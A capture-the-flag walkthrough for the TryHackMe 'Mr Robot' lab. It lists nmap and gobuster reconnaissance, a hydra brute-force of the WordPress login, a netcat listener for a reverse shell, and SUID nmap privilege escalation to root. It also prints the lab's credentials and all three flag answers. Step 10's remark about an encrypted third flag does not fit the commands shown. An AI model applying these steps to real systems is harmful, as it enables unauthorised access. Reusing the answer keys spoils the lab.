---
title: "TryHackMe - Mr Robot CTF Walkthrough"
date: 2024-12-16
categories: [TryHackMe]
tags: [CTF, WordPress, Privilege Escalation, SUID, Reverse Shell]
image: assets/images/thm-cover/mr-robot-Cover.jpg
---

# TryHackMe - Mr. Robot CTF Walkthrough

---

## Step 1: Network Scanning
Conduct a network scan to identify open ports and running services on the target.

```bash
sleep33@THM:~$ nmap -v -sCV -oN nmap.txt <TARGET_IP> 
```

### Result:
- **Open Ports Found**:
  - Port 80: HTTP Service
  - Port 443: HTTPS Service
  - Port 22: SSH Service

---

## Step 2: Directory Enumeration
Perform directory enumeration using Gobuster to find hidden directories or files.

```bash
sleep33@THM:~$ gobuster dir -u http://<TARGET_IP>/ -w /path/to/wordlist.txt
```

### Result:
- **Discovered Directories**:
  - `/robots.txt`
  - `/fsocity.dic`
  - `/key-1-of-3.txt`

---

## Step 3: First Flag
Using the discovered `/robots.txt` file, locate and read the first flag.

```bash
sleep33@THM:~$ curl http://<TARGET_IP>/robots.txt
```

### Result:
Contents of `robots.txt`:
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

```bash
sleep33@THM:~$ curl http://<TARGET_IP>/key-1-of-3.txt
```

**Flag 1:**
```
073403c8a58a1f80d943455fb30724b9
```

---

## Step 4: Exploring `fsocity.dic` File
Download and examine the `fsocity.dic` file, which contains a wordlist that may be useful for brute-forcing.

```bash
sleep33@THM:~$ wget http://<TARGET_IP>/fsocity.dic
```

### Result:
The file is a large wordlist containing potential usernames and passwords.

---

## Step 5: Brute-forcing WordPress Login
Attempt brute-forcing the WordPress login page using `fsocity.dic` as a wordlist to guess the username and password.

```bash
sleep33@THM:~$ hydra -L fsocity.dic -P fsocity.dic <TARGET_IP> http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location"
```

### Credentials Found:
- **Username**: `elliot`
- **Password**: `ER28-0652`

---

## Step 6: Accessing WordPress and Uploading a Reverse Shell
Log in to the WordPress admin panel and upload a reverse shell to gain a foothold.

### Reverse Shell Code:
Use a PHP reverse shell script and configure it to connect back to your machine.

---

## Step 7: Gaining Shell Access
Trigger the reverse shell by accessing the uploaded file and listen on a port to catch the shell.

```bash
sleep33@THM:~$ nc -lvnp <PORT>
```

---

## Step 8: Privilege Escalation - SUID Binary
Find files with the SUID bit set to check for potential privilege escalation paths.

```bash
sleep33@THM:~$ find / -perm -4000 2>/dev/null
```

### SUID Binary Found:
- `nmap`

### Using Nmap in Interactive Mode to Gain Root Access
Launch Nmap in interactive mode and access a root shell.

```bash
sleep33@THM:~$ nmap --interactive
```

```bash
nmap> !sh
# whoami
root
```

---

## Step 9: Finding the Second Flag
With root access, locate the second flag.

```bash
sleep33@THM:~$ cat /root/key-2-of-3.txt
```

**Flag 2:**
```
822c73956184f694993bede3eb39f959
```

---

## Step 10: Locating the Third Flag
Search the home directory of the `robot` user for the final flag.

```bash
sleep33@THM:~$ cat /home/robot/key-3-of-3.txt
```

### Password Prompt:
You may encounter an encrypted flag, requiring the robot user’s password. You can check if `robot` has any passwords or if SSH keys are present to unlock this file.

**Flag 3:**
```
04787ddef27c3dee1ee161b21670b4e4
```

---

## Summary
In this walkthrough, we scanned the target, enumerated directories, used a dictionary attack to gain WordPress access, uploaded a reverse shell, escalated privileges using an SUID binary (`nmap`), and retrieved all flags. 

### Flags Summary:
- **Flag 1**: `073403c8a58a1f80d943455fb30724b9`
- **Flag 2**: `822c73956184f694993bede3eb39f959`
- **Flag 3**: `04787ddef27c3dee1ee161b21670b4e4`

---
